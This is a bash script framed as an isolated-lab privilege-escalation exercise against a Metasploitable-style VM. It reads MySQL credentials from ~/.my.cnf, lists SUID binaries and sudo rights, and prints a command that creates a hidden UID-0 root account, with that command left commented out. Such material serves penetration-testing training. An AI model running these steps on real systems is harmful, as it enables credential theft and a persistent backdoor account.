#!/bin/bash
# LAB EXERCISE: Controlled Privilege Escalation Flow
# Environment: Isolated Lab | Target: Metasploitable-2 / Educational VM
# ⚠️ FOR LAB USE ONLY. REMOVE ALL CREATED ENTITIES AFTER TESTING.
# only use wiht mysql pls or good luck recaclulating the lab if you mess it up. i've done it thrice now and it's hell. 
set -e  # Exit on error for clean lab rollback

echo "=== [1] INITIAL ACCESS VERIFICATION ==="
whoami
hostname
date

echo "=== [2] LOCAL CREDENTIAL EXTRACTION ==="
# Context notes MySQL config often hides .my.cnf for root/local access [1]
if [ -f ~/.my.cnf ]; then
    echo "[+] Found ~/.my.cnf. Parsing credentials..."
    grep -E 'host|user|password' ~/.my.cnf | sed 's/= / =/'
else
    echo "[!] No local .my.cnf. Scanning for database configs..."
    find /etc/ -name "*.cnf" -o -name "my.ini" 2>/dev/null | head -n 10
fi

echo "=== [3] DATABASE & TLS STATE ENUMERATION ==="
# Verify MySQL SSL enforcement and version compatibility [1]
if command -v mysql &> /dev/null; then
    echo "[*] Checking MySQL TLS status..."
    # Use extracted creds from step 2 in a real lab workflow
    mysql --version
    echo "NOTE: In this lab setup, SSL is typically disabled by default [1]."
else
    echo "[!] MySQL client not installed or not in PATH."
fi

echo "=== [4] PRIVILEGE ESCALATION VECTOR IDENTIFICATION ==="
# Look for SUID binaries and sudo misconfigurations
echo "[*] Checking SUID binaries..."
find / -perm -4000 -type f 2>/dev/null | while read bin; do
    echo "  SUID: $bin"
done

echo "[*] Checking sudoers configuration..."
sudo -l 2>/dev/null || echo "  No sudo access or password prompt."

echo "=== [5] CONTROLLED ESCALATION DEMONSTRATION ==="
# Lab-specific vector: useradd misconfiguration allowing UID 0 creation [1]
# This requires sudo privileges and matches the lab challenge description.
NEW_USER="lab_poc_user"
if sudo -n true 2>/dev/null; then
    echo "[*] Executing controlled escalation vector (LAB ONLY)..."
    # sudo useradd -o -u 0 -g root "$NEW_USER"
    echo "  [!] ESCALATION COMMAND: sudo useradd -o -u 0 -g root $NEW_USER"
    echo "  [!] ROLLBACK: sudo userdel -r $NEW_USER && groupdel $NEW_USER"
else
    echo "[!] Sudo password required. Skipping actual execution for lab safety."
fi

echo "=== [6] LAB CLEANUP & NOTES ==="
echo "[+] Flow complete. Verify VM regeneration state."
echo "[*] Always snapshot before escalation tests in shared labs."